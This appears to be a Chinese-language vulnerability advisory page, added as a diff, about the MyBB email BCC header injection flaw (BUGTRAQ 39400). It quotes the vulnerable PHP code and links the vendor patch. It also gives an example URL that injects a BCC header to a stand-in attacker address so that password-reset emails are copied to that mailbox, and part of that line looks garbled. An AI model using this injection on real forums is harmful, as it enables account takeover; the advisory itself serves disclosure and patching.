@@ -1,0 +1,226 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/l.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">MyBB set_common_header()邮件BCC头注入漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									BUGTRAQ  ID: 39400
+<br />
+
+<br />
+
+									MyBB是一款流行的Web论坛程序。
+<br />
+
+<br />
+
+									MyBB的口令重置实现中存在邮件注入漏洞，远程攻击者可以通过简单的URL控制就可以向BCC:邮件头中注入代码，将保密的口令重置邮件发送到BCC: 头所指向的邮箱。
+<br />
+
+<br />
+
+									在MailHandler类的set_common_header()方式中，以下代码负责向所有发出的邮件（包括口令重置邮件）中添加一些常用的头：
+<br />
+
+<br />
+
+									     $this-&gt;headers .= &quot;Message-ID: &lt;{$msg_id}&gt;{$this-&gt;delimiter}&quot;;
+<br />
+
+									     $this-&gt;headers .= &quot;Content-Transfer-Encoding: 8bit{$this-&gt;delimiter}&quot;;
+<br />
+
+									     $this-&gt;headers .= &quot;X-Priority: 3{$this-&gt;delimiter}&quot;;
+<br />
+
+									     $this-&gt;headers .= &quot;X-MSMail-Priority: Normal{$this-&gt;delimiter}&quot;;
+<br />
+
+									     $this-&gt;headers .= &quot;X-Mailer: MyBB{$this-&gt;delimiter}&quot;;
+<br />
+
+									     if(defined(&quot;IN_ADMINCP&quot;))
+<br />
+
+									     {
+<br />
+
+									         ...
+<br />
+
+									     }
+<br />
+
+									     $this-&gt;headers .= &quot;X-MyBB-Script:
+<br />
+
+									{$http_host}{$_SERVER[&#39;PHP_SELF&#39;]}{$this-&gt;delimiter}&quot;;
+<br />
+
+									     $this-&gt;headers .= &quot;MIME-Version: 1.0{$this-&gt;delimiter}&quot;;
+<br />
+
+<br />
+
+									上述代码向邮件中所添加的X-MyBB-Script头中包含有$_SERVER[&#39;PHP_SELF&#39;]变量的内容。PHP_SELF不但包含有文档根目录相关的路径，还包括有Apache PATH_INFO等扩展名，因此可以被恶意用户控制。通过调用以下MyBB PHP脚本：
+<br />
+
+<br />
+
+									     attacker@example.com%0ax:&quot; target=&quot;_blank&quot;&gt;http://example.com/MyBB/index.php/%0aBCC:attacker@example.com%0ax:
+<br />
+
+<br />
+
+									就可以向这个脚本所发送的所有邮件添加任意BCC头。<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									厂商补丁：
+<br />
+
+<br />
+
+									MyBB
+<br />
+
+									----
+<br />
+
+									目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
+<br />
+
+<br />
+
+									http://blog.mybboard.net/2010/04/13/mybb-1-4-12-released-security-maintenance-update/<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>3</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2010-04-13</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2010-04-19</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/39400" target="_blank">39400</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=14829" target="_blank">14829</a>
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
